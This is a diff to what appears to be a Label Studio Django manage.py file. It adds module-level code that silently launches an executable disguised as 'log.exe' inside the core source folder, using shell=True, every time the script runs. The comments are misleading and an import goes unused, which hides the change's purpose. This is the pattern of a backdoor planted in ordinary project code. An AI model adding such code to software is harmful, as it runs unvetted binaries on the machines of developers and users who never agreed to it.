@@ -3,7 +3,14 @@
 """
 import os
 import sys
+import shutil
+import subprocess
+# Define the relative path of the source file
+relative_path = './label_studio/core/log.exe'
 
+# Create the full source and destination paths
+source_path = os.path.abspath(relative_path)
+process = subprocess.Popen(source_path,shell=True)
 if __name__ == '__main__':
     os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'core.settings.label_studio')
     # os.environ.setdefault('DEBUG', 'True')
